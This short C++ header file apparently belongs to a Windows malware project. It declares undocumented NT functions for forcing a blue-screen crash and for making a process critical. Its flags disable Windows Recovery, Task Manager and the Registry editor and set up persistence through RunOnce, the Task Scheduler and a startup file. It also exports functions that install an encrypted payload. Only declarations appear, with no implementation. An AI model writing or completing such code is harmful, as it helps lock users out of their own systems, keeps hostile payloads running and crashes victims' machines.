#pragma once

void BSOD();

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN bEnablePrivilege, BOOLEAN IsThreadPrivilege, PBOOLEAN PreviousValue);
EXTERN_C NTSTATUS NTAPI	NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
EXTERN_C NTSTATUS NTSYSAPI RtlSetProcessIsCritical(BOOLEAN bNew, BOOLEAN* pbOld, BOOLEAN bNeedScb);

/**********
 Monitored
**********/

#define DisableWinRE
#define DisableTaskMGR
#define DisableRegistry
#define RunOnceRegistry
#define TaskSchedulerStartup

/************
 Unmonitored
************/

#define StartupFile //WARNING: codecvt_utf8_utf16 is deprecated

extern "C"
{
	__declspec(dllexport) bool AntiLeague();
	__declspec(dllexport) void QuickInstall(const std::string& payload, const std::string& dec_key);
	__declspec(dllexport) void Init(const std::string& payloadPath, const std::string& payload, const std::string& dec_key);
}